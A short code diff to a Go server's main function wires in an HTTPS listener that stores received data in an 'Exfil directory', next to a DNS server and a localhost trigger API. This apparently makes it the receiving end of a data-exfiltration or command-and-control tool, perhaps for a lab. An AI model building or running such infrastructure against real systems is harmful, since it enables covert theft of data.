@@ -19,6 +19,7 @@ package main
 import (
 	"fmt"
 	"log"
+	"motd_joker_screenmate/internal/https"
 	"net/http"
 
 	"motd_joker_screenmate/internal/dns"
@@ -65,6 +66,7 @@ func main() {
 	log.Printf("DNS port: %d", DNSPort)
 	log.Printf("HTTPS port: %d", HTTPSPort)
 	log.Printf("Trigger API port: %d", TriggerPort)
+	log.Printf("Exfil directory: %s", ExfilDir)
 
 	// Create DNS server instance
 	dnsServer = dns.NewServer(Domain, DNSPort)
@@ -85,10 +87,24 @@ func main() {
 		}
 	}()
 
-	// TODO: Phase 5 - Start HTTPS listener
+	// Start HTTPS server in a goroutine
+	go func() {
+		log.Printf("[MAIN] Starting HTTPS server on port %d...", HTTPSPort)
+		httpsServer := https.NewServer(HTTPSPort, CertDir, ExfilDir)
+		if err := httpsServer.Start(); err != nil {
+			log.Fatalf("[MAIN] HTTPS server failed: %v", err)
+		}
+	}()
 
+	log.Println("[MAIN] ============================================")
 	log.Println("[MAIN] Server running. Press Ctrl+C to stop.")
-	log.Println("[MAIN] To trigger a job: curl -X POST http://localhost:9090/trigger")
+	log.Println("[MAIN] ============================================")
+	log.Println("[MAIN] To trigger a job:")
+	log.Println("[MAIN]   curl -X POST http://localhost:9090/trigger")
+	log.Println("[MAIN] To check status:")
+	log.Println("[MAIN]   curl http://localhost:9090/status")
+	log.Println("[MAIN] ============================================")
+
 	select {} // Block forever
 }
 
